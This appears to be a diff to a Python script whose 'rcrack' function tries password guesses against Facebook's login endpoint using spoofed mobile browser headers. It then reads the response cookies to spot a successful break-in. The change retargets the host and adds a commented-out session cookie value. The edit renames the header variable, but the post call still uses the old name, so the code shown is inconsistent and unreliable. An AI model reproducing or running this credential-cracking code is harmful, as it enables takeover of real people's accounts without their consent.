@@ -216,13 +216,12 @@ def rcrack(uid,pwx,tl):
             'email':uid,
             'pass':ps,
             'login':'Log In'}
-            header_freefb = {'authority': 'mbasic.facebook.com',
-    'method':'POST',
-    'path':'/?tbua=1',
-    'scheme':'https',
+            headers = {
+    'authority': 'x.facebook.com',
     'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
     'accept-language': 'en-US,en;q=0.9',
     'cache-control': 'max-age=0',
+    # 'cookie': 'datr=mDgkaB3SCsAwMbi645wfEQii; sb=mDgkaPxot5qseMzB-JBIGedR; m_pixel_ratio=1.7000000476837158; wd=424x942; ps_l=1; ps_n=1; fr=0w5o87oUVxzU0kPnM..BoJDiY..AAA.0.0.BoJDj_.AWdRBLXJV0FSwvex74MVyfgGaaY',
     'dpr': '1.7000000476837158',
     'sec-ch-prefers-color-scheme': 'light',
     'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
@@ -238,7 +237,7 @@ def rcrack(uid,pwx,tl):
     'upgrade-insecure-requests': '1',
     'user-agent': 'Mozilla/5.0 (Mobile; rv:48.0; A405DL) Gecko/48.0 Firefox/48.0 KAIOS/2.5',
     'viewport-width': '980',
-}
+            }
                   
             lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
